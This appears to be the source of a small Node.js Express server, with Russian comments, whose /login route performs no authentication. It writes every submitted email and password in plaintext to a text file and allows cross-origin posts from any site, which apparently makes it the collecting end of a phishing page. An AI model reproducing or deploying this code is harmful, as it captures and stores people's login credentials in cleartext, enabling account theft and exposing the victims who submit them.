const express = require('express');
const fs = require('fs');
const cors = require('cors'); // Добавьте это
const app = express();
const port = 8000;

app.use(express.json());
app.use(cors());
// Разрешаем CORS (не рекомендуется на боевом сервере)


app.use((_req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    next();
});

app.post('/login', (req, res) => {
    const { email, password } = req.body;

    if (email && password) {
        const timestamp = new Date().toISOString();
        const log_entry = `${timestamp} - Email: ${email}, Password: ${password}\n`;

        fs.appendFile('login_attempts.txt', log_entry, (err) => {
            if (err) {
                console.error(err);
                res.status(500).send('Ошибка записи в файл');
            } else {
                console.log('Попытка входа успешно записана.');
                res.status(200).send('Попытка входа успешно записана');
            }
        });
    } else {
        res.status(400).send('Неполные данные');
    }
});

app.listen(port, () => {
    console.log(`Сервер запущен на порту ${port}`);
});
